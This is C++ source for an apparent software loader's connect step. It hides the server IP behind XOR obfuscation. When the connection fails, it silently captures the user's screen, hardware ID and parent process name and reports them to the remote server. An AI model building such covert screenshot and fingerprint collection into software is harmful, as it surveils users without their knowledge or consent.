#pragma optimize("", off)
#include "loader/Loader.h"
#include "config/Config.h"
#include "config/BuildConfig.h"
#include "network/WhipNexusClient.h"
#include "security/ReverseDetector.h"
#include "security/EmbeddedData.h"
#include "security/HWIDCollector.h"
#include "security/xor.h"

#include <Windows.h>
#include <tlhelp32.h>
#include <vector>
#include <cstdio>

static void getConnParentName(char* dst, size_t dstSize) {
    strncpy_s(dst, dstSize, "Unknown", _TRUNCATE);
    DWORD cur = GetCurrentProcessId(), parent = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do { if (pe.th32ProcessID == cur) { parent = pe.th32ParentProcessID; break; } }
        while (Process32NextW(snap, &pe));
    }
    if (parent) {
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do { if (pe.th32ProcessID == parent) {
                WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, dst, (int)dstSize, nullptr, nullptr);
                break;
            }} while (Process32NextW(snap, &pe));
        }
    }
    CloseHandle(snap);
}

void Loader::stepConnect() {
    const char* serverHost = XOR("51.178.31.94");
    const uint16_t serverPort = BuildConfig::serverPort;

    nexusClient->setCertificatePinning(
        TlsConfig::enableCertificatePinning,
        TlsConfig::pinnedCertificateHash
    );

    if (TlsConfig::enableCertificatePinning) {
        bool hashEmpty = true;
        for (int i = 0; i < 32; i++) {
            if (TlsConfig::pinnedCertificateHash[i] != 0x00) { hashEmpty = false; break; }
        }
        if (hashEmpty) {
            handleError(Error(ErrorCode::InvalidArgument, "Certificate hash not configured"), false);
            return;
        }
    }

    auto connectResult = nexusClient->connect(serverHost, serverPort);
    if (!connectResult) {
        // Notification Discord fire-and-forget : client séparé + screenshot en parallèle.
        // Le main thread passe immédiatement à handleError (qui attend l'input utilisateur),
        // donnant au thread le temps d'envoyer le report.
        struct FailCtx {
            WhipNexusClient*                  client;
            std::vector<std::vector<uint8_t>> shots;
            char                              parentName[260];
            char                              downloadId[33];
            char                              hwid[65];
            HANDLE                            connDone;
            HANDLE                            shotsDone;
            const char*                       host;
            uint16_t                          port;
        };
        auto* fc = new FailCtx{};
        fc->client = new WhipNexusClient();
        fc->host   = serverHost;
        fc->port   = serverPort;
        fc->connDone  = CreateEventA(nullptr, FALSE, FALSE, nullptr);
        fc->shotsDone = CreateEventA(nullptr, FALSE, FALSE, nullptr);
        fc->parentName[0] = '\0';
        fc->downloadId[0] = '\0';
        fc->hwid[0]       = '\0';

        // Collecter downloadId et hwid séparément
        if (dependencies.embeddedDataReader &&
            dependencies.embeddedDataReader->hasEmbeddedDownloadId()) {
            auto dlRes = dependencies.embeddedDataReader->readDownloadId();
            if (dlRes) dlRes.value().toChars(fc->downloadId, sizeof(fc->downloadId));
        }
        if (dependencies.hwidCollector) {
            HWID hw;
            if (dependencies.hwidCollector->collect(hw) && hw.hash[0])
                strncpy_s(fc->hwid, sizeof(fc->hwid), hw.hash, _TRUNCATE);
        }
        getConnParentName(fc->parentName, sizeof(fc->parentName));

        if (fc->client->initialize()) {
            // Thread A : reconnexion pour le report
            CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
                auto* ctx = static_cast<FailCtx*>(p);
                ctx->client->setCertificatePinning(TlsConfig::enableCertificatePinning,
                                                   TlsConfig::pinnedCertificateHash);
                ctx->client->connect(ctx->host, ctx->port);
                SetEvent(ctx->connDone);
                return 0;
            }, fc, 0, nullptr);
            // Thread B : capture écran
            CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
                auto* ctx = static_cast<FailCtx*>(p);
                ctx->shots = ReverseDetector::captureScreen();
                SetEvent(ctx->shotsDone);
                return 0;
            }, fc, 0, nullptr);
            // Thread C : attend A+B puis envoie (ne bloque PAS le main thread)
            CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
                auto* ctx = static_cast<FailCtx*>(p);
                HANDLE ev[2] = { ctx->connDone, ctx->shotsDone };
                WaitForMultipleObjects(2, ev, TRUE, 2000);
                CloseHandle(ctx->connDone);
                CloseHandle(ctx->shotsDone);
                ctx->client->sendConnectFailReport(
                    ctx->parentName[0] ? ctx->parentName : "connect-failed",
                    ctx->shots.empty() ? nullptr : &ctx->shots,
                    ctx->downloadId[0] ? ctx->downloadId : nullptr,
                    ctx->hwid[0]       ? ctx->hwid       : nullptr);
                delete ctx->client;
                delete ctx;
                return 0;
            }, fc, 0, nullptr);
        } else {
            CloseHandle(fc->connDone);
            CloseHandle(fc->shotsDone);
            delete fc->client;
            delete fc;
        }

        handleError(Error(ErrorCode::NetworkError, "Failed to connect to server"), true);
        return;
    }

    transitionTo(LoaderStep::Authenticating, "Authenticating...");
}
#pragma optimize("", on)
